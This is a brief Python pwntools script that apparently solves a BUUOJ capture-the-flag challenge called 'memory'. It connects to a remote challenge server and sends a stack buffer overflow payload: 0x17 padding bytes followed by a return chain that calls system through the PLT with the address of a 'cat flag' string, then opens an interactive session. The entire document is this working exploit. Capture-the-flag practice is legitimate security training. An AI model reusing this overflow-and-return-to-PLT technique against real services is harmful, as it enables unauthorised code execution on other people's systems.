from pwn import *

context.arch = 'i386'
elf = ELF('./memory')
r = remote('node3.buuoj.cn', 27695)
cat_flag_addr = 0x80487e0

r.sendline('a' * 0x17 + flat([elf.plt['system'], elf.symbols['main'], cat_flag_addr]))
r.interactive()
